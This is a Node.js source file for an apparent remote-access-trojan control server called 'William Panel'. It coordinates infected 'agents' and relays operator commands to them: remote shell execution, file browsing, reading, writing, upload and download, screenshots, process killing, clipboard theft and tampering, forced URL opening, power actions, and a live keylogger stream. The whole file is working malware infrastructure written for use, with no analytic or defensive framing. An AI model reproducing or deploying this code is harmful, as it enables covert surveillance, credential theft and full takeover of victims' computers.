const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  maxHttpBufferSize: 1e8
});

const PORT = process.env.PORT || 3000;
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'william_secret_2024';
const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'admin123';

let connectedDevices = {};
let panelSockets = new Set();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Auth middleware for panel
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (password === PANEL_PASSWORD) {
    res.json({ success: true, token: Buffer.from(PANEL_PASSWORD).toString('base64') });
  } else {
    res.status(401).json({ success: false, message: 'Wrong password bro' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

io.on('connection', (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

  // ─── PANEL AUTH ───
  socket.on('panel:auth', ({ token }) => {
    if (Buffer.from(token, 'base64').toString() === PANEL_PASSWORD) {
      panelSockets.add(socket.id);
      socket.emit('panel:auth:ok');
      socket.emit('devices:update', Object.values(connectedDevices));
    } else {
      socket.emit('panel:auth:fail');
    }
  });

  // ─── AGENT REGISTER ───
  socket.on('agent:register', (data) => {
    if (data.token !== AUTH_TOKEN) { socket.disconnect(); return; }
    connectedDevices[socket.id] = {
      id: socket.id,
      hostname: data.hostname,
      platform: data.platform,
      arch: data.arch,
      cpus: data.cpus,
      totalMem: data.totalMem,
      username: data.username,
      ip: clientIp,
      connectedAt: new Date().toISOString(),
      online: true
    };
    broadcastToPanel('devices:update', Object.values(connectedDevices));
    console.log(`[+] Agent: ${data.hostname} @ ${clientIp}`);
  });

  // ─── SHELL COMMAND ───
  socket.on('panel:shell', ({ targetId, command, sessionId }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:shell', { command, sessionId });
  });
  socket.on('agent:shell:output', ({ output, sessionId }) => {
    broadcastToPanel('panel:shell:output', { deviceId: socket.id, output, sessionId });
  });

  // ─── FILE MANAGER ───
  socket.on('panel:ls', ({ targetId, dirPath }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:ls', { dirPath });
  });
  socket.on('agent:ls:result', (data) => {
    broadcastToPanel('panel:ls:result', { deviceId: socket.id, ...data });
  });

  socket.on('panel:readfile', ({ targetId, filePath }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:readfile', { filePath });
  });
  socket.on('agent:readfile:result', (data) => {
    broadcastToPanel('panel:readfile:result', { deviceId: socket.id, ...data });
  });

  socket.on('panel:deletefile', ({ targetId, filePath }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:deletefile', { filePath });
  });
  socket.on('agent:deletefile:result', (data) => {
    broadcastToPanel('panel:deletefile:result', { deviceId: socket.id, ...data });
  });

  socket.on('panel:writefile', ({ targetId, filePath, content }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:writefile', { filePath, content });
  });
  socket.on('agent:writefile:result', (data) => {
    broadcastToPanel('panel:writefile:result', { deviceId: socket.id, ...data });
  });

  // Upload file to device
  socket.on('panel:upload', ({ targetId, filePath, data: fileData }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:upload', { filePath, data: fileData });
  });
  socket.on('agent:upload:result', (data) => {
    broadcastToPanel('panel:upload:result', { deviceId: socket.id, ...data });
  });

  // Download file from device
  socket.on('panel:download', ({ targetId, filePath }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:download', { filePath });
  });
  socket.on('agent:download:result', (data) => {
    broadcastToPanel('panel:download:result', { deviceId: socket.id, ...data });
  });

  // ─── SCREENSHOT ───
  socket.on('panel:screenshot', ({ targetId }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:screenshot');
  });
  socket.on('agent:screenshot:result', (data) => {
    broadcastToPanel('panel:screenshot:result', { deviceId: socket.id, img: data.img, timestamp: data.timestamp });
  });

  // ─── PROCESS LIST ───
  socket.on('panel:processes', ({ targetId }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:processes');
  });
  socket.on('agent:processes:result', (data) => {
    broadcastToPanel('panel:processes:result', { deviceId: socket.id, ...data });
  });

  socket.on('panel:killprocess', ({ targetId, pid }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:killprocess', { pid });
  });
  socket.on('agent:killprocess:result', (data) => {
    broadcastToPanel('panel:killprocess:result', { deviceId: socket.id, ...data });
  });

  // ─── SYSTEM INFO (live stats) ───
  socket.on('panel:sysinfo', ({ targetId }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:sysinfo');
  });
  socket.on('agent:sysinfo:result', (data) => {
    broadcastToPanel('panel:sysinfo:result', { deviceId: socket.id, ...data });
  });

  // ─── KEYLOG STREAM ───
  socket.on('agent:keylog', (data) => {
    broadcastToPanel('panel:keylog', { deviceId: socket.id, ...data });
  });

  // ─── CLIPBOARD ───
  socket.on('panel:clipboard:get', ({ targetId }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:clipboard:get');
  });
  socket.on('agent:clipboard:result', (data) => {
    broadcastToPanel('panel:clipboard:result', { deviceId: socket.id, ...data });
  });

  socket.on('panel:clipboard:set', ({ targetId, text }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:clipboard:set', { text });
  });

  // ─── ALERT / POPUP on device ───
  socket.on('panel:alert', ({ targetId, message }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:alert', { message });
  });

  // ─── OPEN URL on device ───
  socket.on('panel:openurl', ({ targetId, url }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:openurl', { url });
  });

  // ─── SHUTDOWN / RESTART ───
  socket.on('panel:shutdown', ({ targetId, action }) => {
    if (!panelSockets.has(socket.id)) return;
    io.to(targetId).emit('agent:poweraction', { action }); // action: shutdown | restart | logoff | sleep
  });

  // ─── DISCONNECT ───
  socket.on('disconnect', () => {
    panelSockets.delete(socket.id);
    if (connectedDevices[socket.id]) {
      console.log(`[-] Agent disconnected: ${connectedDevices[socket.id].hostname}`);
      delete connectedDevices[socket.id];
      broadcastToPanel('devices:update', Object.values(connectedDevices));
    }
  });
});

function broadcastToPanel(event, data) {
  panelSockets.forEach(id => {
    io.to(id).emit(event, data);
  });
}

server.listen(PORT, () => {
  console.log(`[William Panel] Running on port ${PORT}`);
  console.log(`[William Panel] Agent token: ${AUTH_TOKEN}`);
});
